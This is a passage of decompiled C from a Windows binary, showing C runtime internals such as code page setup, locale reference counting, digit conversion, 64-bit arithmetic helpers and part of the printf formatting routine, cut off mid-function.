  local_20 = (byte *)((int)local_20 + 1);
  uVar4 = uVar4 + 0x30;
  if (0xef < uVar4) goto code_r0x00411a86;
  goto LAB_00411a6d;
code_r0x00411a86:
  if (((uVar6 == 65000) || (uVar6 == 0xfde9)) ||
     (BVar5 = IsValidCodePage(uVar6 & 0xffff), uVar9 = extraout_EDX_00, BVar5 == 0))
  goto LAB_00411c05;
  BVar5 = GetCPInfo(uVar6,&local_1c);
  if (BVar5 != 0) {
    FUN_0040f8c0((undefined (*) [16])(param_2 + 0x1c),0,0x101);
    *(uint *)(param_2 + 4) = uVar6;
    *(undefined4 *)(param_2 + 0xc) = 0;
    if (local_1c.MaxCharSize < 2) {
      *(undefined4 *)(param_2 + 8) = 0;
    }
    else {
      if (local_1c.LeadByte[0] != '\0') {
        pBVar12 = local_1c.LeadByte + 1;
        do {
          bVar3 = *pBVar12;
          if (bVar3 == 0) break;
          for (uVar6 = (uint)pBVar12[-1]; uVar6 <= bVar3; uVar6 = uVar6 + 1) {
            pbVar8 = (byte *)(param_2 + 0x1d + uVar6);
            *pbVar8 = *pbVar8 | 4;
          }
          pBVar1 = pBVar12 + 1;
          pBVar12 = pBVar12 + 2;
        } while (*pBVar1 != 0);
      }
      pbVar8 = (byte *)(param_2 + 0x1e);
      iVar11 = 0xfe;
      do {
        *pbVar8 = *pbVar8 | 8;
        pbVar8 = pbVar8 + 1;
        iVar11 = iVar11 + -1;
      } while (iVar11 != 0);
      uVar9 = FUN_004116e9();
      *(undefined4 *)(param_2 + 0xc) = uVar9;
      *(undefined4 *)(param_2 + 8) = extraout_EDX_03;
    }
    *(undefined4 *)(param_2 + 0x10) = 0;
    *(undefined4 *)(param_2 + 0x14) = 0;
    *(undefined4 *)(param_2 + 0x18) = 0;
LAB_00411b9e:
    FUN_0041177c();
    uVar9 = extraout_EDX_02;
    goto LAB_00411c05;
  }
  uVar9 = extraout_EDX_01;
  if (DAT_004241cc == 0) goto LAB_00411c05;
  goto LAB_00411a5a;
}



void __cdecl FUN_00411dcc(int param_1)

{
  undefined *puVar1;
  int **ppiVar2;
  
  if ((((*(undefined4 **)(param_1 + 0xbc) != (undefined4 *)0x0) &&
       (*(undefined4 **)(param_1 + 0xbc) != &DAT_00422ef8)) &&
      (*(int **)(param_1 + 0xb0) != (int *)0x0)) && (**(int **)(param_1 + 0xb0) == 0)) {
    if ((*(int **)(param_1 + 0xb8) != (int *)0x0) && (**(int **)(param_1 + 0xb8) == 0)) {
      FUN_0040b61e();
      FUN_004164ab(*(int *)(param_1 + 0xbc));
    }
    if ((*(int **)(param_1 + 0xb4) != (int *)0x0) && (**(int **)(param_1 + 0xb4) == 0)) {
      FUN_0040b61e();
      FUN_00416466(*(int **)(param_1 + 0xbc));
    }
    FUN_0040b61e();
    FUN_0040b61e();
  }
  if ((*(int **)(param_1 + 0xc0) != (int *)0x0) && (**(int **)(param_1 + 0xc0) == 0)) {
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
  }
  puVar1 = *(undefined **)(param_1 + 0xd4);
  if ((puVar1 != &DAT_00422e38) && (*(int *)(puVar1 + 0xb4) == 0)) {
    FUN_004162d1((int)puVar1);
    FUN_0040b61e();
  }
  ppiVar2 = (int **)(param_1 + 0x50);
  param_1 = 6;
  do {
    if (((ppiVar2[-2] != (int *)&DAT_00422cb8) && (*ppiVar2 != (int *)0x0)) && (**ppiVar2 == 0)) {
      FUN_0040b61e();
    }
    if (((ppiVar2[-1] != (int *)0x0) && (ppiVar2[1] != (int *)0x0)) && (*ppiVar2[1] == 0)) {
      FUN_0040b61e();
    }
    ppiVar2 = ppiVar2 + 4;
    param_1 = param_1 + -1;
  } while (param_1 != 0);
  FUN_0040b61e();
  return;
}



void __cdecl FUN_00411f15(LONG *param_1)

{
  LONG *pLVar1;
  LONG **ppLVar2;
  
  pLVar1 = param_1;
  InterlockedIncrement(param_1);
  if ((LONG *)param_1[0x2c] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2c]);
  }
  if ((LONG *)param_1[0x2e] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2e]);
  }
  if ((LONG *)param_1[0x2d] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2d]);
  }
  if ((LONG *)param_1[0x30] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x30]);
  }
  ppLVar2 = (LONG **)(param_1 + 0x14);
  param_1 = (LONG *)&DAT_00000006;
  do {
    if ((ppLVar2[-2] != (LONG *)&DAT_00422cb8) && (*ppLVar2 != (LONG *)0x0)) {
      InterlockedIncrement(*ppLVar2);
    }
    if ((ppLVar2[-1] != (LONG *)0x0) && (ppLVar2[1] != (LONG *)0x0)) {
      InterlockedIncrement(ppLVar2[1]);
    }
    ppLVar2 = ppLVar2 + 4;
    param_1 = (LONG *)((int)param_1 + -1);
  } while (param_1 != (LONG *)0x0);
  InterlockedIncrement((LONG *)(pLVar1[0x35] + 0xb4));
  return;
}



LONG * __cdecl FUN_00411fa4(LONG *param_1)

{
  LONG *pLVar1;
  LONG **ppLVar2;
  
  pLVar1 = param_1;
  if (param_1 != (LONG *)0x0) {
    InterlockedDecrement(param_1);
    if ((LONG *)param_1[0x2c] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2c]);
    }
    if ((LONG *)param_1[0x2e] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2e]);
    }
    if ((LONG *)param_1[0x2d] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2d]);
    }
    if ((LONG *)param_1[0x30] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x30]);
    }
    ppLVar2 = (LONG **)(param_1 + 0x14);
    param_1 = (LONG *)&DAT_00000006;
    do {
      if ((ppLVar2[-2] != (LONG *)&DAT_00422cb8) && (*ppLVar2 != (LONG *)0x0)) {
        InterlockedDecrement(*ppLVar2);
      }
      if ((ppLVar2[-1] != (LONG *)0x0) && (ppLVar2[1] != (LONG *)0x0)) {
        InterlockedDecrement(ppLVar2[1]);
      }
      ppLVar2 = ppLVar2 + 4;
      param_1 = (LONG *)((int)param_1 + -1);
    } while (param_1 != (LONG *)0x0);
    InterlockedDecrement((LONG *)(pLVar1[0x35] + 0xb4));
  }
  return pLVar1;
}



LONG * FUN_0041203d(void)

{
  LONG *pLVar1;
  LONG **in_EAX;
  LONG *unaff_EDI;
  
  if ((unaff_EDI != (LONG *)0x0) && (in_EAX != (LONG **)0x0)) {
    pLVar1 = *in_EAX;
    if (pLVar1 != unaff_EDI) {
      *in_EAX = unaff_EDI;
      FUN_00411f15(unaff_EDI);
      if (pLVar1 != (LONG *)0x0) {
        FUN_00411fa4(pLVar1);
        if ((*pLVar1 == 0) && (pLVar1 != (LONG *)&DAT_00422cc0)) {
          FUN_00411dcc((int)pLVar1);
        }
      }
    }
    return unaff_EDI;
  }
  return (LONG *)0x0;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined (*) [16] FUN_0041207b(void)

{
  undefined (*pauVar1) [16];
  LONG *pLVar2;
  int unaff_EBP;
  
  FUN_0040d634(&DAT_00420620,0xc);
  pauVar1 = FUN_0040cdba();
  if (((*(uint *)pauVar1[7] & DAT_00422cb4) == 0) || (*(int *)(pauVar1[6] + 0xc) == 0)) {
    FUN_0040e055(0xc);
    *(undefined4 *)(unaff_EBP + -4) = 0;
    pLVar2 = FUN_0041203d();
    *(LONG **)(unaff_EBP + -0x1c) = pLVar2;
    *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
    FUN_004120e5();
  }
  else {
    pauVar1 = FUN_0040cdba();
    pauVar1 = *(undefined (**) [16])(pauVar1[6] + 0xc);
  }
  if (pauVar1 == (undefined (*) [16])0x0) {
    FUN_0040ebac(0x20);
  }
  return pauVar1;
}



void FUN_004120e5(void)

{
  FUN_0040df7b(0xc);
  return;
}



int __cdecl FUN_004120f1(ushort param_1)

{
  int iVar1;
  ushort uVar2;
  
  if (param_1 < 0x30) {
    return -1;
  }
  if (param_1 < 0x3a) {
    return param_1 - 0x30;
  }
  iVar1 = 0xff10;
  if (param_1 < 0xff10) {
    iVar1 = 0x660;
    if (param_1 < 0x660) {
      return -1;
    }
    if (param_1 < 0x66a) goto LAB_0041213d;
    iVar1 = 0x6f0;
    if (param_1 < 0x6f0) {
      return -1;
    }
    if (param_1 < 0x6fa) goto LAB_0041213d;
    iVar1 = 0x966;
    if (param_1 < 0x966) {
      return -1;
    }
    if (param_1 < 0x970) goto LAB_0041213d;
    iVar1 = 0x9e6;
    if (param_1 < 0x9e6) {
      return -1;
    }
    if (param_1 < 0x9f0) goto LAB_0041213d;
    iVar1 = 0xa66;
    if (param_1 < 0xa66) {
      return -1;
    }
    if (param_1 < 0xa70) goto LAB_0041213d;
    iVar1 = 0xae6;
    if (param_1 < 0xae6) {
      return -1;
    }
    if (param_1 < 0xaf0) goto LAB_0041213d;
    iVar1 = 0xb66;
    if (param_1 < 0xb66) {
      return -1;
    }
    if (param_1 < 0xb70) goto LAB_0041213d;
    iVar1 = 0xc66;
    if (param_1 < 0xc66) {
      return -1;
    }
    if (param_1 < 0xc70) goto LAB_0041213d;
    iVar1 = 0xce6;
    if (param_1 < 0xce6) {
      return -1;
    }
    if (param_1 < 0xcf0) goto LAB_0041213d;
    iVar1 = 0xd66;
    if (param_1 < 0xd66) {
      return -1;
    }
    if (param_1 < 0xd70) goto LAB_0041213d;
    iVar1 = 0xe50;
    if (param_1 < 0xe50) {
      return -1;
    }
    if (param_1 < 0xe5a) goto LAB_0041213d;
    iVar1 = 0xed0;
    if (param_1 < 0xed0) {
      return -1;
    }
    if (param_1 < 0xeda) goto LAB_0041213d;
    iVar1 = 0xf20;
    if (param_1 < 0xf20) {
      return -1;
    }
    if (param_1 < 0xf2a) goto LAB_0041213d;
    iVar1 = 0x1040;
    if (param_1 < 0x1040) {
      return -1;
    }
    if (param_1 < 0x104a) goto LAB_0041213d;
    iVar1 = 0x17e0;
    if (param_1 < 0x17e0) {
      return -1;
    }
    if (param_1 < 0x17ea) goto LAB_0041213d;
    iVar1 = 0x1810;
    if (param_1 < 0x1810) {
      return -1;
    }
    uVar2 = 0x181a;
  }
  else {
    uVar2 = 0xff1a;
  }
  if (uVar2 <= param_1) {
    return -1;
  }
LAB_0041213d:
  return (uint)param_1 - iVar1;
}



ushort __cdecl FUN_004122cc(WCHAR param_1,ushort param_2,undefined (**param_3) [16])

{
  BOOL BVar1;
  undefined (*local_18 [2]) [16];
  int local_10;
  char local_c;
  ushort local_8 [2];
  
  if (param_1 == L'\xffff') {
    local_8[0] = 0;
  }
  else if ((ushort)param_1 < 0x100) {
    local_8[0] = *(ushort *)(DAT_00422e34 + (uint)(ushort)param_1 * 2) & param_2;
  }
  else {
    FUN_0040b970(local_18,param_3);
    BVar1 = FUN_004165d0(local_18,1,&param_1,1,local_8);
    if (BVar1 == 0) {
      local_8[0] = 0;
    }
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
  }
  return local_8[0] & param_2;
}



longlong FUN_00412360(uint param_1,uint param_2,uint param_3,uint param_4)

{
  if ((param_4 | param_2) == 0) {
    return (ulonglong)param_1 * (ulonglong)param_3;
  }
  return CONCAT44((int)((ulonglong)param_1 * (ulonglong)param_3 >> 0x20) +
                  param_2 * param_3 + param_1 * param_4,
                  (int)((ulonglong)param_1 * (ulonglong)param_3));
}



undefined8 FUN_004123a0(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  
  uVar3 = param_1;
  uVar8 = param_4;
  uVar6 = param_2;
  uVar9 = param_3;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar5 = uVar8 >> 1;
      uVar9 = uVar9 >> 1 | (uint)((uVar8 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar8 = uVar5;
      uVar6 = uVar7;
    } while (uVar5 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar9;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar8 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar8)) ||
       ((param_2 <= uVar8 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  return CONCAT44(uVar3,iVar4);
}



void __fastcall FUN_00412435(byte **param_1)

{
  byte **ppbVar1;
  byte in_AL;
  uint uVar2;
  int *unaff_ESI;
  
  if (((*(byte *)(param_1 + 3) & 0x40) == 0) || (param_1[2] != (byte *)0x0)) {
    ppbVar1 = param_1 + 1;
    *ppbVar1 = *ppbVar1 + -1;
    if ((int)*ppbVar1 < 0) {
      uVar2 = FUN_0040fad4(in_AL,(int *)param_1);
    }
    else {
      **param_1 = in_AL;
      *param_1 = *param_1 + 1;
      uVar2 = (uint)in_AL;
    }
    if (uVar2 == 0xffffffff) {
      *unaff_ESI = -1;
      return;
    }
  }
  *unaff_ESI = *unaff_ESI + 1;
  return;
}



void __cdecl FUN_00412468(undefined4 param_1,int param_2,byte **param_3)

{
  int *in_EAX;
  
  do {
    if (param_2 < 1) {
      return;
    }
    param_2 = param_2 + -1;
    FUN_00412435(param_3);
  } while (*in_EAX != -1);
  return;
}



void __cdecl FUN_0041248e(int param_1)

{
  int *in_EAX;
  int *piVar1;
  byte **unaff_EDI;
  
  if (((*(byte *)(unaff_EDI + 3) & 0x40) == 0) || (unaff_EDI[2] != (byte *)0x0)) {
    while (0 < param_1) {
      param_1 = param_1 + -1;
      FUN_00412435(unaff_EDI);
      if (*in_EAX == -1) {
        piVar1 = (int *)FUN_0040caaa();
        if (*piVar1 != 0x2a) {
          return;
        }
        FUN_00412435(unaff_EDI);
      }
    }
  }
  else {
    *in_EAX = *in_EAX + param_1;
  }
  return;
}



void __cdecl FUN_004124db(byte **param_1,byte *param_2,undefined (**param_3) [16],uint **param_4)

{
  byte bVar1;
  WCHAR WVar2;
  byte **ppbVar3;
  ushort uVar4;
  undefined4 *puVar5;
  uint uVar6;
  uint uVar7;
  undefined2 extraout_var_00;
  undefined3 extraout_var;
  int iVar8;
  code *pcVar9;
  undefined *puVar10;
  int extraout_ECX;
  byte bVar11;
  undefined *extraout_EDX;
  uint extraout_EDX_00;
  undefined *puVar12;
  uint extraout_EDX_01;
  uint extraout_EDX_02;
  uint extraout_EDX_03;
  uint extraout_EDX_04;
  uint extraout_EDX_05;
  uint extraout_EDX_06;
  uint extraout_EDX_07;
  byte *pbVar13;
  uint *puVar14;
  char *pcVar15;
  uint *puVar16;
  bool bVar17;
  undefined8 uVar18;
  uint **ppuVar19;
  uint *puVar20;
  uint *puVar21;
  undefined4 uVar22;
  undefined (**ppauVar23) [16];
  uint *local_27c;
  uint *local_278;
  int local_274;
  undefined4 local_270;
  uint *local_268;
  byte **local_264;
  int local_260;
  int local_25c;
  uint *local_258;
  undefined (*local_254 [2]) [16];
  int local_24c;
  char local_248;
  uint local_244;
  byte *local_240;
  int local_23c;
  uint *local_238;
  int local_234;
  undefined local_230;
  char local_22f;
  uint local_22c;
  uint **local_228;
  uint *local_224;
  uint *local_220;
  uint *local_21c;
  byte local_215;
  uint local_214;
  uint local_210 [127];
  undefined local_11 [9];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_264 = param_1;
  local_228 = param_4;
  local_260 = 0;
  local_214 = 0;
  local_238 = (uint *)0x0;
  local_21c = (uint *)0x0;
  local_234 = 0;
  local_25c = 0;
  local_23c = 0;
  FUN_0040b970(local_254,param_3);
  if (param_1 == (byte **)0x0) {
switchD_0041266d_caseD_9:
    puVar5 = (undefined4 *)FUN_0040caaa();
    *puVar5 = 0x16;
  }
  else {
    puVar12 = extraout_EDX;
    if ((*(byte *)(param_1 + 3) & 0x40) == 0) {
      uVar6 = FUN_0040dac0((int)param_1);
      puVar12 = &DAT_00422448;
      if ((uVar6 == 0xffffffff) || (uVar6 == 0xfffffffe)) {
        puVar10 = &DAT_00422448;
      }
      else {
        puVar10 = (undefined *)((uVar6 & 0x1f) * 0x40 + (&DAT_004257c0)[(int)uVar6 >> 5]);
      }
      if ((puVar10[0x24] & 0x7f) == 0) {
        if ((uVar6 == 0xffffffff) || (uVar6 == 0xfffffffe)) {
          puVar10 = &DAT_00422448;
        }
        else {
          puVar10 = (undefined *)((uVar6 & 0x1f) * 0x40 + (&DAT_004257c0)[(int)uVar6 >> 5]);
        }
        if ((puVar10[0x24] & 0x80) == 0) goto LAB_004125df;
      }
      goto switchD_0041266d_caseD_9;
    }
LAB_004125df:
    if (param_2 == (byte *)0x0) goto switchD_0041266d_caseD_9;
    local_215 = *param_2;
    uVar6 = CONCAT31((int3)((uint)puVar12 >> 8),local_215);
    local_22c = 0;
    local_224 = (uint *)0x0;
    local_244 = 0;
    local_258 = (uint *)0x0;
    if (local_215 == 0) {
LAB_00413061:
      if (local_248 != '\0') {
        *(uint *)(local_24c + 0x70) = *(uint *)(local_24c + 0x70) & 0xfffffffd;
      }
      goto LAB_0041307a;
    }
    while( true ) {
      pbVar13 = param_2 + 1;
      uVar7 = 0;
      local_240 = pbVar13;
      if ((int)local_22c < 0) break;
      bVar11 = (byte)uVar6;
      if ((byte)(bVar11 - 0x20) < 0x59) {
        uVar7 = (byte)(&DAT_0041ca68)[(char)bVar11] & 0xf;
      }
      local_244 = (uint)((byte)(&DAT_0041ca88)[local_244 + uVar7 * 9] >> 4);
      switch(local_244) {
      case 0:
switchD_0041266d_caseD_0:
        local_23c = 0;
        uVar4 = FUN_0041592d(bVar11,local_254);
        if (CONCAT22(extraout_var_00,uVar4) != 0) {
          FUN_00412435(local_264);
          local_240 = param_2 + 2;
          if (*pbVar13 == 0) goto switchD_0041266d_caseD_9;
        }
        FUN_00412435(local_264);
        uVar6 = extraout_EDX_01;
        break;
      case 1:
        local_21c = (uint *)0xffffffff;
        local_270 = 0;
        local_25c = 0;
        local_238 = (uint *)0x0;
        local_234 = 0;
        local_214 = 0;
        local_23c = 0;
        break;
      case 2:
        if (bVar11 == 0x20) {
          local_214 = local_214 | 2;
        }
        else if (bVar11 == 0x23) {
          local_214 = local_214 | 0x80;
        }
        else if (bVar11 == 0x2b) {
          local_214 = local_214 | 1;
        }
        else if (bVar11 == 0x2d) {
          local_214 = local_214 | 4;
        }
        else if (bVar11 == 0x30) {
          local_214 = local_214 | 8;
        }
        break;
      case 3:
        if (bVar11 == 0x2a) {
          local_228 = param_4 + 1;
          local_238 = *param_4;
          if ((int)local_238 < 0) {
            local_214 = local_214 | 4;
            local_238 = (uint *)-(int)local_238;
          }
        }
        else {
          local_238 = (uint *)((int)local_238 * 10 + -0x30 + (int)(char)bVar11);
        }
        break;
      case 4:
        local_21c = (uint *)0x0;
        break;
      case 5:
        if (bVar11 == 0x2a) {
          local_228 = param_4 + 1;
          local_21c = *param_4;
          if ((int)local_21c < 0) {
            local_21c = (uint *)0xffffffff;
          }
        }
        else {
          local_21c = (uint *)((int)local_21c * 10 + -0x30 + (int)(char)bVar11);
        }
        break;
      case 6:
        if (bVar11 == 0x49) {
          bVar1 = *pbVar13;
          if ((bVar1 == 0x36) && (param_2[2] == 0x34)) {
            local_214 = local_214 | 0x8000;
            local_240 = param_2 + 3;
          }
          else if ((bVar1 == 0x33) && (param_2[2] == 0x32)) {
            local_214 = local_214 & 0xffff7fff;
            local_240 = param_2 + 3;
          }
          else if (((((bVar1 != 100) && (bVar1 != 0x69)) && (bVar1 != 0x6f)) &&
                   ((bVar1 != 0x75 && (bVar1 != 0x78)))) && (bVar1 != 0x58)) {
            local_244 = 0;
            goto switchD_0041266d_caseD_0;
          }
        }
        else if (bVar11 == 0x68) {
          local_214 = local_214 | 0x20;
        }
        else if (bVar11 == 0x6c) {
          if (*pbVar13 == 0x6c) {
            local_214 = local_214 | 0x1000;
            local_240 = param_2 + 2;
          }
          else {
            local_214 = local_214 | 0x10;
          }
        }
        else if (bVar11 == 0x77) {
          local_214 = local_214 | 0x800;
        }
        break;
      case 7:
        if ((char)bVar11 < 'e') {
          if (bVar11 == 100) {
LAB_00412b59:
            local_214 = local_214 | 0x40;
LAB_00412b60:
            local_224 = (uint *)0xa;
LAB_00412b6a:
            if (((local_214 & 0x8000) == 0) && ((local_214 & 0x1000) == 0)) {
              local_228 = param_4 + 1;
              if ((local_214 & 0x20) == 0) {
                puVar14 = *param_4;
                if ((local_214 & 0x40) == 0) {
                  puVar16 = (uint *)0x0;
                }
                else {
                  puVar16 = (uint *)((int)puVar14 >> 0x1f);
                }
              }
              else {
                if ((local_214 & 0x40) == 0) {
                  puVar14 = (uint *)(uint)*(ushort *)param_4;
                }
                else {
                  puVar14 = (uint *)(int)*(short *)param_4;
                }
                puVar16 = (uint *)((int)puVar14 >> 0x1f);
              }
            }
            else {
              local_228 = param_4 + 2;
              puVar14 = *param_4;
              puVar16 = param_4[1];
            }
            if ((((local_214 & 0x40) != 0) && ((int)puVar16 < 1)) && ((int)puVar16 < 0)) {
              bVar17 = puVar14 != (uint *)0x0;
              puVar14 = (uint *)-(int)puVar14;
              puVar16 = (uint *)-(int)((int)puVar16 + (uint)bVar17);
              local_214 = local_214 | 0x100;
            }
            uVar18 = CONCAT44(puVar16,puVar14);
            if ((local_214 & 0x9000) == 0) {
              puVar16 = (uint *)0x0;
            }
            if ((int)local_21c < 0) {
              local_21c = (uint *)0x1;
            }
            else {
              local_214 = local_214 & 0xfffffff7;
              if (0x200 < (int)local_21c) {
                local_21c = (uint *)0x200;
              }
            }
            if (((uint)puVar14 | (uint)puVar16) == 0) {
              local_234 = 0;
            }
            puVar14 = (uint *)local_11;
            while( true ) {
              puVar20 = puVar16;
              uVar6 = (uint)((ulonglong)uVar18 >> 0x20);
              puVar16 = (uint *)((int)local_21c + -1);
              if (((int)local_21c < 1) && (((uint)uVar18 | (uint)puVar20) == 0)) break;
              local_21c = puVar16;
              uVar18 = FUN_004123a0((uint)uVar18,(uint)puVar20,(uint)local_224,
                                    (int)local_224 >> 0x1f);
              iVar8 = extraout_ECX + 0x30;
              if (0x39 < iVar8) {
                iVar8 = iVar8 + local_260;
              }
              *(char *)puVar14 = (char)iVar8;
              puVar14 = (uint *)((int)puVar14 + -1);
              puVar16 = (uint *)((ulonglong)uVar18 >> 0x20);
              local_268 = puVar20;
            }
            local_224 = (uint *)(local_11 + -(int)puVar14);
            local_220 = (uint *)((int)puVar14 + 1);
            local_21c = puVar16;
            if (((local_214 & 0x200) != 0) &&
               ((local_224 == (uint *)0x0 || (*(char *)local_220 != '0')))) {
              *(char *)puVar14 = '0';
              local_224 = (uint *)(local_11 + -(int)puVar14 + 1);
              local_220 = puVar14;
            }
          }
          else if ((char)bVar11 < 'T') {
            if (bVar11 == 0x53) {
              if ((local_214 & 0x830) == 0) {
                local_214 = local_214 | 0x800;
              }
              goto LAB_00412988;
            }
            if (bVar11 == 0x41) {
LAB_00412906:
              local_215 = bVar11 + 0x20;
              uVar6 = (uint)local_215;
              local_270 = 1;
LAB_00412919:
              bVar11 = (byte)uVar6;
              local_214 = local_214 | 0x40;
              local_268 = (uint *)0x200;
              puVar14 = local_210;
              puVar16 = local_268;
              puVar20 = local_210;
              if ((int)local_21c < 0) {
                local_21c = (uint *)&DAT_00000006;
              }
              else if (local_21c == (uint *)0x0) {
                if (bVar11 == 0x67) {
                  local_21c = (uint *)0x1;
                }
              }
              else {
                if (0x200 < (int)local_21c) {
                  local_21c = (uint *)0x200;
                }
                if (0xa3 < (int)local_21c) {
                  puVar16 = (uint *)((int)local_21c + 0x15d);
                  local_220 = local_210;
                  local_258 = (uint *)FUN_00413b52((uint)puVar16);
                  puVar14 = local_258;
                  bVar11 = local_215;
                  puVar20 = local_258;
                  if (local_258 == (uint *)0x0) {
                    local_21c = (uint *)0xa3;
                    puVar14 = local_210;
                    puVar16 = local_268;
                    puVar20 = local_220;
                  }
                }
              }
              local_220 = puVar20;
              local_268 = puVar16;
              local_228 = param_4 + 2;
              local_27c = *param_4;
              local_278 = param_4[1];
              ppauVar23 = local_254;
              iVar8 = (int)(char)bVar11;
              ppuVar19 = &local_27c;
              puVar16 = puVar14;
              puVar20 = local_268;
              puVar21 = local_21c;
              uVar22 = local_270;
              pcVar9 = (code *)FUN_0040cb6e(DAT_00422df8);
              (*pcVar9)(ppuVar19,puVar16,puVar20,iVar8,puVar21,uVar22,ppauVar23);
              uVar6 = local_214 & 0x80;
              if ((uVar6 != 0) && (local_21c == (uint *)0x0)) {
                ppauVar23 = local_254;
                puVar16 = puVar14;
                pcVar9 = (code *)FUN_0040cb6e(DAT_00422e04);
                (*pcVar9)(puVar16,ppauVar23);
              }
              if ((local_215 == 0x67) && (uVar6 == 0)) {
                ppauVar23 = local_254;
                puVar16 = puVar14;
                pcVar9 = (code *)FUN_0040cb6e(DAT_00422e00);
                (*pcVar9)(puVar16,ppauVar23);
              }
              if (*(char *)puVar14 == '-') {
                local_214 = local_214 | 0x100;
                puVar14 = (uint *)((int)puVar14 + 1);
                local_220 = puVar14;
              }
LAB_00412abb:
              local_224 = (uint *)FUN_00415330(puVar14);
              uVar6 = extraout_EDX_02;
            }
            else if (bVar11 == 0x43) {
              if ((local_214 & 0x830) == 0) {
                local_214 = local_214 | 0x800;
              }
LAB_004129fb:
              local_228 = param_4 + 1;
              if ((local_214 & 0x810) == 0) {
                local_210[0]._0_1_ = *(undefined *)param_4;
                local_224 = (uint *)0x1;
              }
              else {
                uVar18 = FUN_0041677a((int *)&local_224,(undefined (*) [16])local_210,0x200,
                                      *(WCHAR *)param_4);
                uVar6 = (uint)((ulonglong)uVar18 >> 0x20);
                if ((int)uVar18 != 0) {
                  local_25c = 1;
                }
              }
              local_220 = local_210;
            }
            else if ((bVar11 == 0x45) || (bVar11 == 0x47)) goto LAB_00412906;
          }
          else {
            if (bVar11 == 0x58) goto LAB_00412cbc;
            if (bVar11 == 0x5a) {
              puVar14 = *param_4;
              local_228 = param_4 + 1;
              if ((puVar14 == (uint *)0x0) ||
                 (local_220 = (uint *)puVar14[1], local_220 == (uint *)0x0)) {
                local_220 = DAT_00422db0;
                puVar14 = DAT_00422db0;
                goto LAB_00412abb;
              }
              local_224 = (uint *)(int)*(WCHAR *)puVar14;
              if ((local_214 & 0x800) == 0) {
                local_23c = 0;
              }
              else {
                uVar6 = (int)local_224 >> 0x1f;
                local_224 = (uint *)((int)local_224 / 2);
                local_23c = 1;
              }
            }
            else {
              if (bVar11 == 0x61) goto LAB_00412919;
              if (bVar11 == 99) goto LAB_004129fb;
            }
          }
LAB_00412e95:
          if (local_25c == 0) {
            if ((local_214 & 0x40) != 0) {
              if ((local_214 & 0x100) == 0) {
                if ((local_214 & 1) == 0) {
                  if ((local_214 & 2) == 0) goto LAB_00412ede;
                  local_230 = 0x20;
                }
                else {
                  local_230 = 0x2b;
                }
              }
              else {
                local_230 = 0x2d;
              }
              local_234 = 1;
            }
LAB_00412ede:
            pcVar15 = (char *)((int)local_238 + (-local_234 - (int)local_224));
            if ((local_214 & 0xc) == 0) {
              FUN_00412468(0x20,(int)pcVar15,local_264);
            }
            ppbVar3 = local_264;
            FUN_0041248e(local_234);
            if (((local_214 & 8) != 0) && ((local_214 & 4) == 0)) {
              FUN_00412468(0x30,(int)pcVar15,ppbVar3);
            }
            if ((local_23c == 0) || ((int)local_224 < 1)) {
              FUN_0041248e((int)local_224);
              uVar6 = extraout_EDX_05;
            }
            else {
              local_268 = local_224;
              puVar14 = local_220;
              do {
                WVar2 = *(WCHAR *)puVar14;
                local_268 = (uint *)((int)local_268 + -1);
                puVar14 = (uint *)((int)puVar14 + 2);
                uVar18 = FUN_0041677a(&local_274,(undefined (*) [16])(local_11 + 1),6,WVar2);
                uVar6 = (uint)((ulonglong)uVar18 >> 0x20);
                if (((int)uVar18 != 0) || (local_274 == 0)) {
                  local_22c = 0xffffffff;
                  break;
                }
                FUN_0041248e(local_274);
                uVar6 = extraout_EDX_04;
              } while (local_268 != (uint *)0x0);
            }
            if ((-1 < (int)local_22c) && ((local_214 & 4) != 0)) {
              FUN_00412468(0x20,(int)pcVar15,ppbVar3);
              uVar6 = extraout_EDX_06;
            }
          }
        }
        else {
          if ('p' < (char)bVar11) {
            if (bVar11 == 0x73) {
LAB_00412988:
              puVar14 = local_21c;
              if (local_21c == (uint *)0xffffffff) {
                puVar14 = (uint *)0x7fffffff;
              }
              local_228 = param_4 + 1;
              local_220 = *param_4;
              if ((local_214 & 0x810) == 0) {
                local_224 = local_220;
                if (local_220 == (uint *)0x0) {
                  local_220 = DAT_00422db0;
                  local_224 = DAT_00422db0;
                }
                for (; (puVar14 != (uint *)0x0 &&
                       (puVar14 = (uint *)((int)puVar14 + -1), *(char *)local_224 != '\0'));
                    local_224 = (uint *)((int)local_224 + 1)) {
                }
                local_224 = (uint *)((int)local_224 - (int)local_220);
              }
              else {
                if (local_220 == (uint *)0x0) {
                  local_220 = DAT_00422db4;
                }
                local_23c = 1;
                for (puVar16 = local_220;
                    (puVar14 != (uint *)0x0 &&
                    (puVar14 = (uint *)((int)puVar14 + -1), *(WCHAR *)puVar16 != L'\0'));
